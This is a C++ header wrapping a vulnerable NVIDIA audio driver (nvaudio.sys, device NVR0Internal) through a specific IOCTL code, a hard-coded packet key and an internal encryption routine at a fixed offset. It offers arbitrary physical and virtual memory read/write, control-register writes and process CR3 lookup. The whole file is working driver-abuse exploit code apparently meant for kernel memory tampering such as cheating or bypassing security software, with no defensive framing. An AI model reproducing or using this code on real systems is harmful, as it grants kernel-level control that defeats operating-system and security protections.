#pragma once
#include <Windows.h>
#include <iostream>
#include <tlhelp32.h>

struct NVDrv
{

public:
    DWORD                   ReadCr(int cr);
    BOOL                    WriteCr(int cr, DWORD64 value);

    std::wstring            GetProcessPath(const std::wstring& processName);
    uintptr_t               GetProcessBase(const std::wstring& processName);
    uintptr_t               GetProcessCR3(uintptr_t base_address);
    uintptr_t               GetSystemCR3();

    uintptr_t               MmGetPhysicalAddress(uintptr_t virtual_address);
    uintptr_t               TranslateLinearToPhysicalAddress(uintptr_t virtual_address);


    BOOL                    ReadPhysicalMemory(uintptr_t physical_address, void* OUT res, int size);
    BOOL                    WritePhysicalMemory(uintptr_t physical_address, void* IN  res, int size);

    BOOL                    ReadVirtualMemory(uintptr_t address, LPVOID output, unsigned long size);
    BOOL                    WriteVirtualMemory(uintptr_t address, LPVOID data, unsigned long size);
    
    BOOL                    SwapReadContext(uintptr_t target_cr3);

    NVDrv()
    {
        HMODULE nvaudio = LoadLibraryW(L"C:\\nvaudio.sys");

        if (!nvaudio)
        {
            printf("nvaudio.sys not found at C: directory!\n");
            exit(5000);
        }

        encrypt_payload = (decltype(encrypt_payload))(__int64(nvaudio) + 0x2130);

        this->nvhandle = CreateFileW(L"\\\\.\\NVR0Internal", GENERIC_READ | GENERIC_WRITE, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_HIDDEN, NULL);

        if (this->nvhandle != INVALID_HANDLE_VALUE) {
            printf("NVR0Internal Handle: %p\n", this->nvhandle);
        }
        else {
            printf("Driver is not loaded!\n");
            exit(5000);
        }
    }

    template<typename T>
    T Read(uintptr_t address)
    {
        T buffer;

        if (!ReadVirtualMemory(address, &buffer, sizeof(T)))
            return NULL;

        return buffer;
    }

    template<typename T>
    BOOL Write(uintptr_t address, T val)
    {
        if (!WriteVirtualMemory(address, (LPVOID)&val, sizeof(T)))
            return FALSE;

        return TRUE;

    }

    enum NVControlRegisters {
        CR0 = 0,
        CR2 = 2,
        CR3 = 3,
        CR4 = 4
    };

private:
#define DEBUG TRUE
    static int constexpr ioctl_code = 0x9C40A484;

    enum class NVFunction : int
    {
        read_cr = 0,
        write_cr = 1,
        phys_req = 0x26,
        phys_read = 0x14,
        phys_write = 0x15
    };

    struct request { };

    struct request_memcpy : request
    {
        NVFunction request_id;
        int size;
        __int64 dst_addr;
        __int64 src_addr;
        char unk[0x20];
        unsigned __int64 packet_key[0x40 / 8];
        char unk_data[0x138 - 0x40 - 56];
    };

    struct request_phys_addr : request
    {
        NVFunction request_id;
        int unk_0;
        __int64 result_addr;
        __int64 virtual_addr;
        int writevalue;
        char unk[0x20 - 4];
        unsigned __int64 packet_key[0x40 / 8];
        char unk_data[0x138 - 0x40 - 56];
    };

    struct request_readcr : request
    {
        NVFunction request_id;
        int unk_0;
        int cr_num;
        int unk10;
        int unk14;
        int unk18;
        int result;
        char unk[0x20 - 4];
        unsigned __int64 packet_key[0x40 / 8] = { 12868886329971960498, 13552922889676271240, 10838534925730813900, 11819403095038824665,16047435637536096 ,10679697536739367056 ,18271467892729589711 ,6472933704646412218 };;
        char unk_data[0x138 - 0x40 - 56];
    };

    struct request_writecr : request
    {
        NVFunction request_id;
        int unk_0;
        int cr_num;
        int unk10;
        int unk14;
        int unk18;
        int writevalue;
        char unk[0x20 - 4];
        unsigned __int64 packet_key[0x40 / 8];
        char unk_data[0x138 - 0x40 - 56];
    };

    void* (*encrypt_payload)(request* data_crypt, int, void* temp_buf) = nullptr;
    HANDLE nvhandle = INVALID_HANDLE_VALUE;
    uintptr_t target_cr3 = 0;
};